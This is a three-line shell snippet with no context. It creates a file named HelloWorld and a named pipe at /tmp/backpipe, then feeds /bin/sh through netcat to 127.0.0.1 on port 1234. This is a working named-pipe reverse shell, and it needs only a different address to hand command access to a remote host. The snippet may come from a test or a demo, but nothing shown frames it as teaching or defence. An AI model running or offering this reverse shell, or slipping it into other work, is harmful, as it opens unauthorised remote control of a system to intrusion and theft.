touch HelloWorld
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 127.0.0.1 1234 1>/tmp/backpipe
